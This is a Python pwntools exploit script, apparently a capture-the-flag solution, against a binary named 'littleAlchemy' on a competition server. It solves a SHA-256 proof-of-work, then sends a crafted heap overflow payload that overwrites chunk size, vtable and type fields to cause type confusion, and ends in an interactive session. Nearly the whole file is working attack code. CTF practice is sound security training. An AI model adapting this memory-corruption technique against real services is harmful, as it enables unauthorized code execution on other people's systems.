#!/usr/bin/env python3

from pwn import *

import hashlib
from itertools import product

exe = ELF("./littleAlchemy")

context.binary = exe

def solve_pow(start_string, hash_end):
    for chars in product(string.ascii_letters, repeat=4):
        candidate = start_string + bytes(map(ord, chars))
        m = hashlib.sha256()
        m.update(candidate)
        if m.hexdigest().endswith(hash_end):
            print(f'POW solved: {candidate}')
            return candidate

    return None


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        p = remote("challs.m0lecon.it", 2123)
        p.recvuntil("Give me a string starting with ")
        start_string = p.recvuntil(" ")[:-1]
        p.recvuntil('such that its sha256sum ends in ')
        hash_end = p.recvuntil('.')[:-1].decode()
        p.sendline(solve_pow(start_string, hash_end))
        return p


def main():
    r = conn()

    def create_element(pos, source_1, source_2):
        r.sendlineafter(">", "1")
        r.sendlineafter(": ", str(pos))
        r.sendlineafter("]:", str(source_1))
        r.sendlineafter("]:", str(source_2))

    def edit_element(pos, new_name):
        r.sendlineafter(">", "4")
        r.sendlineafter(": ", str(pos))
        r.sendlineafter(": ", new_name)

    # good luck pwning :)

    type1 = (2**64-2**61+10) ^ 0x4242424242424242
    type2 = 0x4242424242424242

    create_element(0, -1, -1)
    create_element(1, -1, -1)
    create_element(2, -1, -1)
    
    payload = b'X'*0x10  # name

    payload += b'Y'*0x8  # chunk size
    payload += b'V'*0x8  # vtable
    payload += p64(0x1)  # is_simple_element
    payload += p64(type1)  # type
    payload += b'X'*0x10 # name

    payload += b'Y'*0x8  # chunk size
    payload += b'V'*0x8  # vtable
    payload += p64(0x1)  # is_simple_element
    payload += p64(type2)  # type

    
    edit_element(0, payload)

    create_element(3, 1, 2)

    r.interactive()


if __name__ == "__main__":
    main()